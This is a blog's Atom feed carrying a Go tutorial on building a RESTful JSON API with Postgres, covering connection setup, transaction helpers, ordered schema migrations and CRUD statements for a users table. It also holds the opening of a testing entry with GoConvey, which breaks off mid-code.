<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[thought|pipe]]></title>
  <link href="http://elauqsap.github.io/atom.xml" rel="self"/>
  <link href="http://elauqsap.github.io/"/>
  <updated>2016-09-30T00:21:45-05:00</updated>
  <id>http://elauqsap.github.io/</id>
  <author>
    <name><![CDATA[elauqsap]]></name>
    <email><![CDATA[3lauqsap@gmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[How to Build a RESTful JSON API in Go - Database Part II]]></title>
    <link href="http://elauqsap.github.io/blog/2016/09/29/how-to-build-a-restful-json-api-in-go-database-part-ii/"/>
    <updated>2016-09-29T23:19:20-05:00</updated>
    <id>http://elauqsap.github.io/blog/2016/09/29/how-to-build-a-restful-json-api-in-go-database-part-ii</id>
    <content type="html"><![CDATA[<p>In this portion of building a <a href="https://github.com/elauqsap/echo-postgres-json-api">RESTful JSON API with a Postgres database</a>, we explore the database powering the backend. I decided to use the builtin SQL library with a Postgres driver rather than using an ORM.</p>

<!--more-->


<h3>Database</h3>

<p>Configuring the connection is important and we need to make sure it can used elsewhere. By exporting <code>Config</code> we can embed it in another configuration structure and populate them all at once using JSON tags. Plus by adding a method receiver we can easily return a connection after a configuration file has been parsed.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">type</span> <span class="p">(</span>
</span><span class='line'>  <span class="c1">// Config for postgres db</span>
</span><span class='line'>  <span class="nx">Config</span> <span class="kd">struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">Auth</span>
</span><span class='line'>    <span class="nx">Name</span>           <span class="kt">string</span> <span class="s">`json:&quot;name&quot;`</span>
</span><span class='line'>    <span class="nx">Host</span>           <span class="kt">string</span> <span class="s">`json:&quot;host&quot;`</span>
</span><span class='line'>    <span class="nx">Port</span>           <span class="kt">int</span>    <span class="s">`json:&quot;port&quot;`</span>
</span><span class='line'>    <span class="nx">SSL</span>            <span class="kt">string</span> <span class="s">`json:&quot;ssl_mode&quot;`</span>
</span><span class='line'>    <span class="nx">ConnectTimeout</span> <span class="kt">int</span>    <span class="s">`json:&quot;connect_timeout&quot;`</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="c1">// Store embeds an instance of a sql.DB so we can</span>
</span><span class='line'>  <span class="c1">// inject new method receivers</span>
</span><span class='line'>  <span class="nx">Store</span> <span class="kd">struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="o">*</span><span class="nx">sql</span><span class="p">.</span><span class="nx">DB</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// NewStore returns a configured *Store instance</span>
</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="nx">Config</span><span class="p">)</span> <span class="nx">NewStore</span><span class="p">()</span> <span class="p">(</span><span class="o">*</span><span class="nx">Store</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">pg</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">Reverse</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">Auth</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nx">source</span> <span class="o">:=</span> <span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;user=%s password=%s dbname=%s host=%s port=%d sslmode=%s connect_timeout=%d&quot;</span><span class="p">,</span> <span class="nx">pg</span><span class="p">.</span><span class="nx">A</span><span class="p">,</span> <span class="nx">pg</span><span class="p">.</span><span class="nx">B</span><span class="p">,</span> <span class="nx">c</span><span class="p">.</span><span class="nx">Name</span><span class="p">,</span> <span class="nx">c</span><span class="p">.</span><span class="nx">Host</span><span class="p">,</span> <span class="nx">c</span><span class="p">.</span><span class="nx">Port</span><span class="p">,</span> <span class="nx">c</span><span class="p">.</span><span class="nx">SSL</span><span class="p">,</span> <span class="nx">c</span><span class="p">.</span><span class="nx">ConnectTimeout</span><span class="p">)</span>
</span><span class='line'>  <span class="nx">db</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">sql</span><span class="p">.</span><span class="nx">Open</span><span class="p">(</span><span class="s">&quot;postgres&quot;</span><span class="p">,</span> <span class="nx">source</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">if</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">Ping</span><span class="p">();</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="o">&amp;</span><span class="nx">Store</span><span class="p">{</span><span class="nx">db</span><span class="p">},</span> <span class="kc">nil</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Because Go allows embedding structures in each other I decided to embed a <code>*sql.DB</code> into a new structure so that I can expand upon it&rsquo;s functions. As seen above we create a new <code>Store{}</code> which contains an embedded pointer to a SQL database. From here we can create new pointer receiver methods that implement functionality that we need. In the example below I created two new methods to perform <code>Exec()</code> &amp; <code>QueryRow()</code> with a SQL transaction.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="c1">// EWT is execute with transaction</span>
</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">Store</span><span class="p">)</span> <span class="nx">EWT</span><span class="p">(</span><span class="nx">st</span> <span class="nx">Statement</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">s</span><span class="p">.</span><span class="nx">Transact</span><span class="p">(</span><span class="kd">func</span><span class="p">(</span><span class="nx">tx</span> <span class="o">*</span><span class="nx">sql</span><span class="p">.</span><span class="nx">Tx</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">res</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">tx</span><span class="p">.</span><span class="nx">Exec</span><span class="p">(</span><span class="nx">st</span><span class="p">.</span><span class="nx">Query</span><span class="p">,</span> <span class="nx">st</span><span class="p">.</span><span class="nx">Args</span><span class="o">...</span><span class="p">)</span>
</span><span class='line'>      <span class="k">if</span> <span class="nx">aff</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">res</span><span class="p">.</span><span class="nx">RowsAffected</span><span class="p">();</span> <span class="nx">aff</span> <span class="p">&lt;</span> <span class="mi">1</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nx">New</span><span class="p">(</span><span class="s">&quot;no change during execution&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>      <span class="k">return</span> <span class="nx">err</span>
</span><span class='line'>  <span class="p">})</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// QWT is query with transaction</span>
</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">s</span> <span class="o">*</span><span class="nx">Store</span><span class="p">)</span> <span class="nx">QWT</span><span class="p">(</span><span class="nx">st</span> <span class="nx">Statement</span><span class="p">,</span> <span class="nx">v</span> <span class="kd">interface</span><span class="p">{})</span> <span class="kt">error</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">s</span><span class="p">.</span><span class="nx">Transact</span><span class="p">(</span><span class="kd">func</span><span class="p">(</span><span class="nx">tx</span> <span class="o">*</span><span class="nx">sql</span><span class="p">.</span><span class="nx">Tx</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">return</span> <span class="nx">tx</span><span class="p">.</span><span class="nx">QueryRow</span><span class="p">(</span><span class="nx">st</span><span class="p">.</span><span class="nx">Query</span><span class="p">,</span> <span class="nx">st</span><span class="p">.</span><span class="nx">Args</span><span class="o">...</span><span class="p">).</span><span class="nx">Scan</span><span class="p">(</span><span class="nx">v</span><span class="p">)</span>
</span><span class='line'>  <span class="p">})</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Another important piece is the structure <code>PropertyMap</code> which is of type <code>map[string]interface{}</code>. This is necessary to read and write JSON values back to the database which we will later see in the Model implementation.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="c1">// PropertyMap allows to map and store JSON data with Postgres</span>
</span><span class='line'><span class="kd">type</span> <span class="nx">PropertyMap</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kd">interface</span><span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Value map to a sql driver value</span>
</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">p</span> <span class="nx">PropertyMap</span><span class="p">)</span> <span class="nx">Value</span><span class="p">()</span> <span class="p">(</span><span class="nx">driver</span><span class="p">.</span><span class="nx">Value</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">j</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">json</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">(</span><span class="nx">p</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">j</span><span class="p">,</span> <span class="nx">err</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Scan map from sql return to a PropertyMap</span>
</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">p</span> <span class="o">*</span><span class="nx">PropertyMap</span><span class="p">)</span> <span class="nx">Scan</span><span class="p">(</span><span class="nx">src</span> <span class="kd">interface</span><span class="p">{})</span> <span class="kt">error</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">source</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">src</span><span class="p">.([]</span><span class="kt">byte</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">!</span><span class="nx">ok</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nx">New</span><span class="p">(</span><span class="s">&quot;Type assertion .([]byte) failed.&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">i</span> <span class="kd">interface</span><span class="p">{}</span>
</span><span class='line'>  <span class="nx">err</span> <span class="o">:=</span> <span class="nx">json</span><span class="p">.</span><span class="nx">Unmarshal</span><span class="p">(</span><span class="nx">source</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">i</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">return</span> <span class="nx">err</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="o">*</span><span class="nx">p</span><span class="p">,</span> <span class="nx">ok</span> <span class="p">=</span> <span class="nx">i</span><span class="p">.(</span><span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="kd">interface</span><span class="p">{})</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">!</span><span class="nx">ok</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nx">New</span><span class="p">(</span><span class="s">&quot;Type assertion .(map[string]interface{}) failed.&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="kc">nil</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Migrations</h3>

<p>The migration component allows the application to be portable while also serving a function in testing. It allows the test database to be easily wiped and the schema to be reconfigured. Which helps in making sure the test outcomes are always the same and no previous tests interfere with the returns.</p>

<p>Because the schema needs to be rebuilt in an order, I created a migration method which sorts each level of the map by their keys and then performs the same sorting on the inner map. This way all you need to do to expand upon the migration is to add your SQL statement with the given order of operation it needs.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="c1">// migrations to perform</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">migrations</span> <span class="p">=</span> <span class="kd">map</span><span class="p">[</span><span class="kt">int</span><span class="p">]</span><span class="kd">map</span><span class="p">[</span><span class="kt">int</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span>
</span><span class='line'>  <span class="c1">// schema commands in the order to be performed</span>
</span><span class='line'>  <span class="nx">mSCHEMA</span><span class="p">:</span> <span class="kd">map</span><span class="p">[</span><span class="kt">int</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span>
</span><span class='line'>      <span class="mi">0</span><span class="p">:</span> <span class="s">`DROP SCHEMA IF EXISTS app CASCADE`</span><span class="p">,</span>
</span><span class='line'>      <span class="mi">1</span><span class="p">:</span> <span class="s">`CREATE SCHEMA IF NOT EXISTS app AUTHORIZATION appbot`</span><span class="p">,</span>
</span><span class='line'>  <span class="p">},</span>
</span><span class='line'>  <span class="c1">// type commands in the order to be performed</span>
</span><span class='line'>  <span class="nx">mTYPE</span><span class="p">:</span> <span class="kd">map</span><span class="p">[</span><span class="kt">int</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span>
</span><span class='line'>      <span class="mi">0</span><span class="p">:</span> <span class="s">`CREATE TYPE app.roles AS ENUM (&#39;user&#39;,&#39;manager&#39;,&#39;admin&#39;)`</span><span class="p">,</span>
</span><span class='line'>  <span class="p">},</span>
</span><span class='line'>  <span class="c1">// table commands in the order to be performed</span>
</span><span class='line'>  <span class="nx">mTABLE</span><span class="p">:</span> <span class="kd">map</span><span class="p">[</span><span class="kt">int</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span>
</span><span class='line'>      <span class="mi">0</span><span class="p">:</span> <span class="s">`CREATE TABLE IF NOT EXISTS app.users (</span>
</span><span class='line'><span class="s">                  id SERIAL PRIMARY KEY,</span>
</span><span class='line'><span class="s">                  first varchar(100) NOT NULL CHECK (first &lt;&gt; &#39;&#39;),</span>
</span><span class='line'><span class="s">                  last varchar(100) NOT NULL CHECK (last &lt;&gt; &#39;&#39;),</span>
</span><span class='line'><span class="s">                  role app.roles NOT NULL DEFAULT &#39;user&#39;,</span>
</span><span class='line'><span class="s">                  api_key char(32) NOT NULL UNIQUE</span>
</span><span class='line'><span class="s">          )`</span><span class="p">,</span>
</span><span class='line'>  <span class="p">},</span>
</span><span class='line'>  <span class="c1">// index commands in the order to be performed</span>
</span><span class='line'>  <span class="nx">mINDEX</span><span class="p">:</span> <span class="kd">map</span><span class="p">[</span><span class="kt">int</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span>
</span><span class='line'>      <span class="mi">0</span><span class="p">:</span> <span class="s">`CREATE INDEX role_idx ON app.users (role)`</span><span class="p">,</span>
</span><span class='line'>  <span class="p">},</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h3>Modeling</h3>

<p>All that is left now is to build your models and make sure they implement the <code>CRUD</code> interface. We only have one model for this example but they should all be the same layout just different structures. As each structure should model the table it will be working with. The JSON tags on each element allow us to easily bind data so that it can be used by both the API and database.</p>

<p>Each <code>CRUD</code> pointer receiver method as defined by the interface should return a <code>Statement</code>. This is essentially the <code>query</code> &amp; <code>args</code> parameters of the <code>*sql.DB</code>&rsquo;s <code>Exec()</code> &amp; <code>QueryRow()</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">type</span> <span class="p">(</span>
</span><span class='line'>  <span class="c1">// User models the app.users table</span>
</span><span class='line'>  <span class="nx">User</span> <span class="kd">struct</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">ID</span>    <span class="kt">int</span>    <span class="s">`json:&quot;id&quot;`</span>
</span><span class='line'>      <span class="nx">First</span> <span class="kt">string</span> <span class="s">`json:&quot;first&quot;`</span>
</span><span class='line'>      <span class="nx">Last</span>  <span class="kt">string</span> <span class="s">`json:&quot;last&quot;`</span>
</span><span class='line'>      <span class="nx">Role</span>  <span class="kt">string</span> <span class="s">`json:&quot;role&quot;`</span>
</span><span class='line'>      <span class="nx">Key</span>   <span class="kt">string</span> <span class="s">`json:&quot;api_key&quot;`</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Create builds the Statement to insert a user into the database</span>
</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="o">*</span><span class="nx">User</span><span class="p">)</span> <span class="nx">Create</span><span class="p">()</span> <span class="nx">Statement</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">u</span><span class="p">.</span><span class="nx">GenerateKey</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="nx">u</span><span class="p">.</span><span class="nx">Role</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">u</span><span class="p">.</span><span class="nx">Role</span> <span class="p">=</span> <span class="nx">USER</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">Statement</span><span class="p">{</span>
</span><span class='line'>      <span class="s">&quot;INSERT INTO app.users (first,last,role,api_key) VALUES ($1,$2,$3,$4)&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="p">[]</span><span class="kd">interface</span><span class="p">{}{</span><span class="nx">u</span><span class="p">.</span><span class="nx">First</span><span class="p">,</span> <span class="nx">u</span><span class="p">.</span><span class="nx">Last</span><span class="p">,</span> <span class="nx">u</span><span class="p">.</span><span class="nx">Role</span><span class="p">,</span> <span class="nx">u</span><span class="p">.</span><span class="nx">Key</span><span class="p">},</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Read creates the Statement to read a user from the database</span>
</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="o">*</span><span class="nx">User</span><span class="p">)</span> <span class="nx">Read</span><span class="p">()</span> <span class="nx">Statement</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">Statement</span><span class="p">{</span>
</span><span class='line'>      <span class="s">&quot;SELECT ROW_TO_JSON(u) FROM (SELECT * FROM app.users WHERE id = $1) AS u&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="p">[]</span><span class="kd">interface</span><span class="p">{}{</span><span class="nx">u</span><span class="p">.</span><span class="nx">ID</span><span class="p">},</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Update creates the Statement to update a user in the database</span>
</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="o">*</span><span class="nx">User</span><span class="p">)</span> <span class="nx">Update</span><span class="p">(</span><span class="nx">v</span> <span class="kd">interface</span><span class="p">{})</span> <span class="nx">Statement</span> <span class="p">{</span>
</span><span class='line'>  <span class="c1">// no merging needed to ignore v</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">Statement</span><span class="p">{</span>
</span><span class='line'>      <span class="s">&quot;UPDATE app.users SET first = $1,last = $2,role = $3 WHERE id = $4&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="p">[]</span><span class="kd">interface</span><span class="p">{}{</span><span class="nx">u</span><span class="p">.</span><span class="nx">First</span><span class="p">,</span> <span class="nx">u</span><span class="p">.</span><span class="nx">Last</span><span class="p">,</span> <span class="nx">u</span><span class="p">.</span><span class="nx">Role</span><span class="p">,</span> <span class="nx">u</span><span class="p">.</span><span class="nx">ID</span><span class="p">},</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Delete creates the Statement to delete a user from the database</span>
</span><span class='line'><span class="kd">func</span> <span class="p">(</span><span class="nx">u</span> <span class="o">*</span><span class="nx">User</span><span class="p">)</span> <span class="nx">Delete</span><span class="p">()</span> <span class="nx">Statement</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">Statement</span><span class="p">{</span>
</span><span class='line'>      <span class="s">&quot;DELETE FROM app.users WHERE id = $1&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="p">[]</span><span class="kd">interface</span><span class="p">{}{</span><span class="nx">u</span><span class="p">.</span><span class="nx">ID</span><span class="p">},</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Build a RESTful JSON API in Go - Testing Part I]]></title>
    <link href="http://elauqsap.github.io/blog/2016/09/27/how-to-build-a-restful-json-api-in-go-testing-part-i/"/>
    <updated>2016-09-27T22:11:53-05:00</updated>
    <id>http://elauqsap.github.io/blog/2016/09/27/how-to-build-a-restful-json-api-in-go-testing-part-i</id>
    <content type="html"><![CDATA[<p>In my recent endeavor with Go I needed to create a <a href="https://github.com/elauqsap/echo-postgres-json-api">RESTful JSON API with a Postgres database</a>. This blog series outlines what I learned and the methods chosen to implement the API. First up in this blog series demonstrates the implementation of Behavioral Driven Development utilizing <a href="https://github.com/smartystreets/goconvey">GoConvey</a>.</p>

<!--more-->


<h3>GoConvey Setup</h3>

<p>There are two primary parts to test within this example and I decided to break them up into &ldquo;sub-packages&rdquo;. These &ldquo;sub-packages&rdquo; include api for handling the RESTful aspects and database for communicating with Postgres instance. Go makes testing very easy by sourcing any file <code>*_test.go</code> and running any test functions that start with <code>Test*</code>. For both &ldquo;sub-packages&rdquo; I created a single Test function and created a general structure to model each test structure.</p>

<p>Take the <code>database</code> sub-package for example. There is only one test function and that is in <code>database_test.go</code>. The other test file only contains test cases to be conveyed.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>database
</span><span class='line'>├── database.go
</span><span class='line'>├── database_test.go
</span><span class='line'>├── migrate.go
</span><span class='line'>├── user.go
</span><span class='line'>└── user_test.go
</span></code></pre></td></tr></table></div></figure>


<p>Diving deeper into <code>TestDatabase()</code>, we test out database connection items and migrate our schema for the test environment. The final portion of the function takes <code>[]ModelTest</code> and runs each test case.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='go'><span class='line'><span class="kd">type</span> <span class="p">(</span>
</span><span class='line'>  <span class="nx">ModelTest</span> <span class="kd">struct</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">Title</span> <span class="kt">string</span>
</span><span class='line'>      <span class="nx">Func</span>  <span class="kd">func</span><span class="p">(</span><span class="o">*</span><span class="nx">Store</span><span class="p">)</span> <span class="kd">func</span><span class="p">()</span>
</span><span class='line'>  <span class="p">}</span>
